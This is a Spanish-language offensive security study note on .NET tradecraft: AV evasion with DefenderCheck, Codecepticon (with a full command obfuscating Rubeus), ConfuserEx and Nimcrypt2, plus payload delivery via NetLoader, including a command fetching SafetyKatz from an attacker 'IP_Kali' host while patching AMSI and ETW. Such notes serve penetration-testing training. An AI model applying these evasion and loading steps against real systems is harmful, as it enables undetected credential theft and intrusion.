# Introducción a . NET ofensivo 

Tags: #Powershell #AD #NET

Actualmente, .NET carece de algunas de las características de seguridad implementadas en **Sistema.Gestión.Automatización.dll**. Hay muchas herramientas ofensivas .NET de código abierto y se usaran las que se ajustan a la metodología de ataque.

```bash 
Al usar .NET (o cualquier otro lenguaje compilado) existen algunos desafíos
1. Detección por contramedidas como AV, EDR, etc.
2. Entrega de la carga útil (Recall Powershells sweet download-execute cradles)
3. Detección mediante registro como registro de creación de procesos, registro de línea de comandos etc.
```
## Tradecraft - AV Bypass 

```bash
1. Enfocarse en el 'bypass' de la detección basada en firma de Windows Defender
2. Para eso, usaremos técnicas como: Obfuscation, String manipulation, etc...
3. Usar de nuevo 'DefenderCheck' para identificar código y strings desde un binario donde Windows Defender podría marcar 
4. Esto ayuda a decidir en modificar el código fuente y minima ofuscación 
5. Tambien se puede usar ofuscación de código fuente 
```

## AV Bypass - Source Code Obfuscation 

* [Codecepticon](https://github.com/sadreck/Codecepticon)
* [Virtual Studio](https://visualstudio.microsoft.com/insiders/?rwnlp=es)

```bash 
1. Codecepticon puede ocultar el código fuente para 'bypass' cualquier detección 'siganture-related'
2. Codecepticon necesita ser compilado en 'Visual Studio Code' y su linea de comando puede ayudar a generar una ocultación de comando más rápida
```

```powershell 
El siguiente comando puede ocultar el código fuente con Codecepticon:

❯ .\Codecepticon.exe --action obfuscate --module csharp --verbose --path "Rubeus.sln" --map-file "Mapping.html" --profile rubeus --rename ncefpavs --rename-method markov --markov-min-length 3 --markov-max-length 10 --markov-min-words 3 --markov-max-words 5 --string-rewrite --string-rewrite-method xor 
```

## AV Bypass - ConfuserEx

```bash 
1. ConfuserEx es una herramienta para ocultar 'binarios compilados'

```

## NetLoader - Payload Delivery 
* [NetLoader](https://gist.github.com/Arno0x/2b223114a726be3c5e7a9cacd25053a2)
```bash 
1. Usar NetLoader para enviar nuestros payloads.

2. Utilizar para cargar un binario desde una ruta de archivo o una URL, y parchear AMSI y ETW mientras se ejecuta.

❯ Loader.exe -path http://IP_Kali/SafetyKatz.exe  

3. Estamos usando NetLoader con el proyecto CsWhispers para añadir D/Invoke y la ejecución indirecta de llamadas al sistema, ya que NetLoader usa las API clásicas de Windows para la inyección de procesos, que pueden detectarse mediante un análisis básico de la tabla de importaciones.
```

```bash 
Pasos para usar Loader con CsWhispers
1. Descarga CsWhispers, ábrelo en Visual Studio y activa “Allow unsafe code” (“Permitir código no seguro”) en la configuración de compilación.
2. Crea un archivo llamado CsWhispers.txt dentro de CsWhispers.Sample y añade las API de NT y las estructuras equivalentes que deban sustituirse en el proyecto NetLoader.
3. Añade el proyecto NetLoader a CsWhispers.Sample, sustituye las API de Windows correspondientes por sus equivalentes de NT y compila la solución.
4. Ofusca el ensamblado generado con Nimcrypt2.
```
